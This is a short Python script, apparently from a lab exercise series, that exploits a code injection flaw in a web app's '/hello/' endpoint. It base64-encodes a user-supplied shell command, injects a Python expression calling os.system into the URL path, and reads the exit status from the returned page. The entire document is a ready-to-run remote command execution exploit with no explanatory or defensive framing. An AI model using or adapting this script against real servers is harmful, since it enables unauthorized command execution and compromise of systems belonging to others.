import requests
from lxml import html
import sys
import base64

if len(sys.argv) != 3:
    print("Usage:\n python3 code_execution_08.py <url> <command>")
    sys.exit(1)

url = sys.argv[1]
command = sys.argv[2]

command_encoded = base64.b64encode(bytes(command, encoding='utf8'))

content = requests.get(f'{url}/hello/"+str(__import__(\'os\').system(__import__(\'base64\').b64decode({command_encoded})))+"').content
html_ = html.fromstring(content)
command_output = int(html_.xpath('//h3/text()')[0].lstrip('Hello ').rstrip('!'))

if command_output == 0:
    print("Command execution completed!!")
else:
    print("[-] Something went wrong!")
